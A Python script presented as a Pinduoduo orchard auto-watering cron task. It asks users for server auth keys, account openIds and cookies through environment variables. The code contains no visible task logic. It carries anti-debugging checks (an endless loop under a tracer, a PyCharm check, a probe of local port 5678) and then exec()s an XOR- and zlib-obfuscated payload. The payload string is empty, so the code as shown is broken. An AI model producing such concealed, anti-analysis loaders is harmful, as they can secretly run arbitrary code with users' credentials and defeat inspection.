"""
拼多多果园 - 自动浇水领水滴)

环境变量:
    wx_server_url  - wx_server 地址，如 http://xxx:8080
    wx_auth        - wx_server 的 auth 密钥
    PDD_OPENID     - 拼多多小程序 openId，多账号用 & 或换行分隔
    PDD_COOKIE     - (可选) 已有完整 Cookie 字符串，提供则跳过登录

依赖:
    pip install requests

cron: 0 8 * * *
new Env('拼多多果园')
"""
import sys, os, base64, zlib

def anti_debug():
    if sys.gettrace() is not None:
        while True:
            pass
    if os.environ.get("PYCHARM_HOSTED") == "1":
        raise RuntimeError("Debugging not allowed")
    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        if sock.connect_ex(('127.0.0.1', 5678)) == 0:
            raise RuntimeError("Debugging detected")
        sock.close()
    except:
        pass
anti_debug()

key = 123
data = base64.b64decode("")
decrypted = bytes([b ^ key for b in data])
decompressed = zlib.decompress(decrypted)
exec(decompressed.decode("utf-8"))
